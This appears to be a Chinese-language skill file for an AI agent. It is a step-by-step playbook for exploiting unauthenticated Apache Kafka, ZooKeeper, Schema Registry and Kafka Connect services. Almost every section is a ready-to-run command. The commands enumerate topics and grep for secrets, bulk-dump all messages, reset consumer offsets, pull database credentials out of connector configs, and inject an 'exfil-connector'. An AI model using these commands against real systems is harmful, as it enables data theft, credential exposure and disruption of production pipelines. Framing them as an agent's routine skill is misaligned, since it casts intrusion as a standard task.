---
name: kafka-attack
description: "Apache Kafka 未授权访问与利用。当发现目标开放 9092 端口、Kafka Broker 无认证、Schema Registry 或 Kafka Connect 暴露、或需要从 Kafka 窃取消息数据时使用。覆盖未授权访问、Topic 枚举与消息批量导出、Consumer Group 操作、Broker 配置窃取、ACL 操控、Schema Registry 利用、Kafka Connect 凭据窃取与恶意 Connector 注入、消息篡改与数据注入"
metadata:
  tags: "kafka,9092,zookeeper,2181,topic,consumer-group,schema-registry,kafka-connect,broker,acl,消息队列"
  category: "exploit"
---

# Apache Kafka 未授权访问与利用

Kafka 默认无认证，Broker（9092）、ZooKeeper（2181）、Schema Registry（8081）、Kafka Connect（8083）任一暴露都可能导致消息窃取、凭据泄露甚至任意命令执行。

## 深入参考（必读）
- 完整利用命令和 payload → 读 [references/attack-techniques.md](references/attack-techniques.md)

---

## Phase 1: 服务发现与版本识别

### 1.1 端口扫描

```bash
# Kafka Broker 默认端口
nmap -sV -p 9092 TARGET

# ZooKeeper 默认端口
nmap -sV -p 2181 TARGET

# Schema Registry / Kafka Connect
nmap -sV -p 8081,8083 TARGET

# 全面扫描 Kafka 生态端口
nmap -sV -p 2181,9092,9093,8081,8082,8083 TARGET
```

### 1.2 Broker 连通性测试

```bash
# 获取 Broker API 版本（无认证即可返回）
kafka-broker-api-versions.sh --bootstrap-server TARGET:9092

# kcat 探测（轻量替代）
kcat -b TARGET:9092 -L
```

**关键判断**：
- 返回 API 版本列表 → 无认证，直接进入 Phase 3
- 连接超时 / 拒绝 → 端口不可达或网络隔离
- 返回认证错误 → 配置了 SASL，需要凭据

---

## Phase 2: 未授权检测

### 2.1 Topic 列表测试

```bash
# 最快速的未授权验证——能列出 Topic 即为无认证
kafka-topics.sh --list --bootstrap-server TARGET:9092

# kcat 替代
kcat -b TARGET:9092 -L | grep "topic"
```

### 2.2 ZooKeeper 未授权测试

```bash
# 四字命令测试（无认证 ZooKeeper）
echo ruok | nc TARGET 2181
# 返回 imok 即为未授权

echo dump | nc TARGET 2181
echo envi | nc TARGET 2181
```

**关键判断**：
- Topic 列表返回成功 → Broker 无认证，进入 Phase 3
- ZooKeeper 返回 imok → ZooKeeper 无认证，可通过 ZK 获取集群元数据
- 两者均失败 → 可能已启用认证，考虑其他入口（Schema Registry / Kafka Connect）

---

## Phase 3: 攻击决策树

```
Broker 无认证？
├─ 是 → Topic 枚举 + 消息批量导出 (Phase 4)
│   ├─ 有 Consumer Group 权限 → Offset 重置 + 消息重放
│   ├─ 有 Broker 配置读取权限 → 配置窃取（含敏感凭据）
│   └─ 有 ACL 管理权限 → ACL 篡改（提权 / 持久化）
├─ Schema Registry 暴露 (8081) → Schema 窃取（数据结构泄露）
├─ Kafka Connect 暴露 (8083)
│   ├─ 可读 Connector 配置 → 凭据窃取（数据库密码等）
│   └─ 可创建 Connector → 恶意 Connector 注入（数据外泄 / 文件写入）
└─ ZooKeeper 暴露 (2181) → 集群元数据 + Broker 配置
```

### 前置信息收集

```bash
# 集群信息概览（在线 broker）
kcat -b TARGET:9092 -L

# KRaft metadata snapshot 离线分析（需要已获取 snapshot 文件）
kafka-metadata-shell.sh --snapshot /path/to/__cluster_metadata-0/00000000000000000000.log

# Broker 配置（可能含敏感信息）
kafka-configs.sh --bootstrap-server TARGET:9092 \
  --entity-type brokers --describe --all

# ACL 列表
kafka-acls.sh --bootstrap-server TARGET:9092 --list

# Consumer Group 列表
kafka-consumer-groups.sh --bootstrap-server TARGET:9092 --list
```

---

## Phase 4: 消息窃取速查

### 4.1 Topic 枚举

```bash
# 列出全部 Topic
kafka-topics.sh --list --bootstrap-server TARGET:9092

# Topic 详情（分区数、副本、ISR）
kafka-topics.sh --describe --bootstrap-server TARGET:9092

# 搜索敏感 Topic 名称
kafka-topics.sh --list --bootstrap-server TARGET:9092 | \
  grep -iE "password|secret|credential|auth|token|user|order|payment|log"
```

### 4.2 单 Topic 消息导出

```bash
# 从头消费指定 Topic（限制条数避免过载）
kafka-console-consumer.sh \
  --bootstrap-server TARGET:9092 \
  --topic TOPIC_NAME \
  --from-beginning \
  --max-messages 1000 > /tmp/kafka_topic_dump.txt

# 从特定 Offset 消费
kafka-console-consumer.sh \
  --bootstrap-server TARGET:9092 \
  --topic TOPIC_NAME \
  --partition 0 \
  --offset 100 \
  --max-messages 500
```

### 4.3 批量导出所有 Topic

```bash
for topic in $(kafka-topics.sh --list --bootstrap-server TARGET:9092); do
  echo "=== Exporting: $topic ==="
  kafka-console-consumer.sh \
    --bootstrap-server TARGET:9092 \
    --topic "$topic" \
    --from-beginning \
    --max-messages 10000 > "/tmp/kafka_${topic}.txt" 2>/dev/null
done
```

### 4.4 Consumer Group 操作

```bash
# 列出所有 Consumer Group
kafka-consumer-groups.sh --bootstrap-server TARGET:9092 --list

# 查看 Group 详情（当前 offset、lag）
kafka-consumer-groups.sh --bootstrap-server TARGET:9092 \
  --group GROUP_NAME --describe

# 重置 Offset 到最早（重新消费全部消息）
kafka-consumer-groups.sh --bootstrap-server TARGET:9092 \
  --group GROUP_NAME \
  --topic TOPIC_NAME \
  --reset-offsets --to-earliest \
  --execute
```

→ 完整消息窃取与 Consumer Group 利用命令 → 读 [references/attack-techniques.md](references/attack-techniques.md)

---

## Phase 5: Kafka Connect 利用速查

### 5.1 Connector 枚举与凭据窃取

```bash
# 列出已安装插件
curl -s http://TARGET:8083/connector-plugins | jq .

# 列出所有 Connector
curl -s http://TARGET:8083/connectors | jq .

# 获取 Connector 配置（高概率含数据库凭据）
curl -s http://TARGET:8083/connectors/CONNECTOR_NAME/config | jq .

# 批量提取敏感配置字段
for conn in $(curl -s http://TARGET:8083/connectors | jq -r '.[]'); do
  echo "=== $conn ==="
  curl -s "http://TARGET:8083/connectors/$conn/config" | \
    jq 'to_entries[] | select(.key | test("password|secret|token|credential|connection.url"; "i"))'
done
```

### 5.2 恶意 Connector 注入

```bash
# 利用 FileStreamSinkConnector 将 Topic 数据写入目标文件系统
curl -X POST http://TARGET:8083/connectors \
  -H "Content-Type: application/json" -d '{
    "name": "exfil-connector",
    "config": {
      "connector.class": "FileStreamSinkConnector",
      "tasks.max": "1",
      "file": "/tmp/exfiltrated-data.txt",
      "topics": "sensitive-topic"
    }
  }'
```

→ 完整 Kafka Connect 利用技术 → 读 [references/attack-techniques.md](references/attack-techniques.md)

---

## Phase 6: Schema Registry 与 ZooKeeper 利用速查

### 6.1 Schema Registry

```bash
# 获取所有 Subject
curl -s http://TARGET:8081/subjects | jq .

# 获取 Schema 详情（含字段定义，可能暴露敏感数据结构）
curl -s http://TARGET:8081/subjects/TOPIC_NAME-value/versions/latest | jq .

# 搜索敏感字段定义
curl -s http://TARGET:8081/subjects/TOPIC_NAME-value/versions/latest | \
  jq -r '.schema' | grep -iE "password|secret|token|ssn|credit"
```

### 6.2 ZooKeeper 利用

```bash
# zkCli.sh 连接
zkCli.sh -server TARGET:2181

# 枚举 Kafka 节点（获取 Broker 列表、Topic 元数据）
# 在 zkCli.sh 中:
ls /brokers/ids
get /brokers/ids/0
ls /brokers/topics
get /config/brokers/0
```

---

## 工具速查

| 工具 | 用途 |
|------|------|
| kafka-topics.sh | Topic 枚举与管理 |
| kafka-console-consumer.sh | 消息消费与导出 |
| kafka-console-producer.sh | 消息生产与注入 |
| kafka-consumer-groups.sh | Consumer Group 管理与 Offset 重置 |
| kafka-configs.sh | Broker/Topic 配置读取 |
| kafka-acls.sh | ACL 列表与操控 |
| kafka-broker-api-versions.sh | Broker 版本探测 |
| kcat (kafkacat) | 轻量级 Kafka 客户端，枚举/消费/生产 |
| zkCli.sh | ZooKeeper 客户端 |
| curl / jq | Schema Registry 和 Kafka Connect REST API |

---

## 注意事项

- `--from-beginning` 会拉取 Topic 全部历史消息，大 Topic 可能产生 GB 级数据，务必配合 `--max-messages` 限制
- Consumer Group Offset 重置是破坏性操作，会导致业务 Consumer 重复消费
- Kafka Connect 创建/删除 Connector 会直接影响数据管道，操作前评估业务影响
- Schema Registry 默认无认证，修改 Schema 可能导致消费端反序列化失败
- ZooKeeper 四字命令在新版本中默认关闭（需 `4lw.commands.whitelist` 配置）
- 消息注入（Producer）可能触发下游业务逻辑异常，谨慎操作
- 批量导出 Topic 时注意磁盘空间，建议先用 `kafka-topics.sh --describe` 查看消息量
